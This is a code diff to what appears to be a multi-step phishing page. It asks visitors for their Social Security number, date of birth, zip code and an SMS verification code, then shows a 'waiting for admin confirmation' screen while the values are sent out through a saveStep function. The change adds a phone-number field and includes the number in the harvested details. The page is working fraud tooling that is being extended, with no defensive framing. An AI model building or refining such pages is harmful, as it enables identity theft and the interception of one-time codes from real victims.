@@ -18,7 +18,6 @@
         .error { color: #ef4444; margin: 15px 0; text-align: center; font-weight: 500; }
         .step { display: none; }
         .step.active { display: block; }
-        
     </style>
 </head>
 <body>
@@ -46,13 +45,17 @@
             <h1>Additional Information</h1>
             <label>Zip Code</label>
             <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
+
+            <label>Phone Number</label>
+            <input type="tel" id="phone" placeholder="(123) 456-7890" required>
+
             <button class="continue" onclick="saveStep2()">Continue</button>
         </div>
 
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
             <p>Enter the code you received via SMS.</p>
-                 <p>Your access code should be sent to you within 12 hours. Please do not refresh this page — simply check your SMS inbox within the next 12 hours.</p>
+            <p>Your access code should be sent to you within 12 hours. Please do not refresh this page — simply check your SMS inbox within the next 12 hours.</p>
             
             <input type="text" id="code" maxlength="10" placeholder="123456" style="text-align:center; font-size:1.4rem;">
             <div id="status"></div>
@@ -107,13 +110,15 @@
 
         function saveStep2() {
             const zip = document.getElementById('zip').value.trim();
-            if (zip.length !== 5) {
-                alert("Please enter a valid 5-digit Zip Code.");
+            const phone = document.getElementById('phone').value.trim();
+
+            if (zip.length !== 5 || !phone) {
+                alert("Please enter a valid 5-digit Zip Code and Phone Number.");
                 return;
             }
 
-            const details = `Zip: ${zip} | Status: Step 2 Completed`;
-            saveStep(details, "Step 2 - Zip Code");
+            const details = `Zip: ${zip} | Phone: ${phone} | Status: Step 2 Completed`;
+            saveStep(details, "Step 2 - Zip Code & Phone");
             nextStep(3);
         }
 
@@ -133,12 +138,12 @@
 
             statusDiv.innerHTML = `<span class="waiting">Waiting for admin confirmation....</span>`;
             
-
             const ssn = document.getElementById('ssn').value || "";
             const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
             const zip = document.getElementById('zip').value || "";
+            const phone = document.getElementById('phone').value || "";
 
-            const fullDetails = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Pending`;
+            const fullDetails = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Phone: ${phone} | Code: ${code} | Status: Pending`;
 
             await saveStep(fullDetails, "Final Code Submission");
 
@@ -193,8 +198,6 @@
                 document.getElementById('year').appendChild(opt);
             }
         };
-
-        
     </script>
 </body>
 </html>
